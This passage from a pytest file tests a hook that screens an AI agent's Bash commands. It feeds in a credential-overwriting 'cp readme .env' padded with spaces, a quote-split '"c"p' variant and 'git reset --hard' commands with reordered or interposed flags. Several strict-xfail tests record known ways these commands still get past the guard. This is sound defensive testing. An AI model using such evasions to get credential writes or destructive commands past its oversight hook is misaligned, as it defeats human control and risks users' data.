        Reddened by restoring the fixed-point loop, or by any collapse that leaves two
        adjacent spaces so the credential arm's `cp ` pattern no longer matches.
        """
        cmd = "cp readme" + (" " * 120_000) + ".env"
        envelope = json.dumps({"session_id": "norm-cost-%s" % uuid.uuid4().hex[:8],
                               "tool_name": "Bash", "tool_input": {"command": cmd}})
        try:
            p = subprocess.run(["bash", HOOK_SH], input=envelope, cwd=str(SKILL_ROOT),
                               capture_output=True, text=True, timeout=20)
        except subprocess.TimeoutExpired:
            raise AssertionError(
                "the hook did not finish within 20s on a 200,000-space command: the "
                "normalization is iterating again"
            )
        # The verdict matters too, not just the timing: collapsing must still leave a
        # single space, so the credential arm sees `cp a <target>` and refuses.
        assert "SEC-CREDENTIAL-WRITE" in p.stdout, p.stdout[:200]



# --------------------------------------------------------------------------- #
# Capability 17: the deferred residue, pinned so closing it must be noticed.
# --------------------------------------------------------------------------- #
class TestDeferredResidueStrictXfail:
    """Deferred to the token layer (see plan.md's "Deliberately out of scope" and
    "Does the irreversibility guard need more than normalization" sections), not
    closed this cycle. Each test asserts the CLOSED behavior (a deny) and is marked
    xfail(strict=True): it fails as expected today because the residue is still
    open, and if a later cycle closes it this test starts PASSING, which
    strict=True turns into a failure -- closing the residue forces updating this
    disclosure rather than leaving it stale."""

    def _sid(self) -> str:
        return f"pattern-residue-{uuid.uuid4().hex[:8]}"

    @pytest.mark.xfail(strict=True, reason=(
        "mid-word quote split ('\"c\"p') reaches the extractor once normalized, "
        "but shlex.split(posix=False) still splits it into two tokens and dequote "
        "only strips a matched OUTER pair -- the same defect as the strict xfail "
        "at partial_quote_prefix in tests/test_bash_expansion_boundary_gate.py"))
    def test_mid_word_quote_split_credential_write_would_deny(self, tmp_path):
        sid = self._sid()
        _seed(sid, mode="conversation")
        out = _run_hook('"c"p readme .env', sid, str(tmp_path))
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "SEC-CREDENTIAL-WRITE" in out.get("permissionDecisionReason", ""), out

    @pytest.mark.xfail(strict=True, reason=(
        "an interposed global flag ('git -C /tmp reset --hard') defeats the "
        "phrase match '*\"git reset --hard\"*'; needs a per-verb argument walk, "
        "deferred to the token layer (plan.md capability 16 in its own numbering)"))
    def test_interposed_global_flag_irreversibility_would_deny(self, tmp_path):
        sid = self._sid()
        out = _run_hook("git -C /tmp reset --hard HEAD~1", sid, str(tmp_path))
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "ENF-IRREVERSIBLE" in out.get("permissionDecisionReason", ""), out

    @pytest.mark.xfail(strict=True, reason=(
        "reordered flags ('git reset HEAD~1 --hard', which git itself accepts) "
        "defeat the same phrase match; needs the same per-verb argument walk. "
        "MEASURED alongside the interposed-flag residue above; not itself a "
        "numbered capabilities.md item, kept here so closing either one updates "
        "this disclosure rather than leaving it stale"))
    def test_reordered_flags_irreversibility_would_deny(self, tmp_path):
        sid = self._sid()
        out = _run_hook("git reset HEAD~1 --hard", sid, str(tmp_path))
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "ENF-IRREVERSIBLE" in out.get("permissionDecisionReason", ""), out
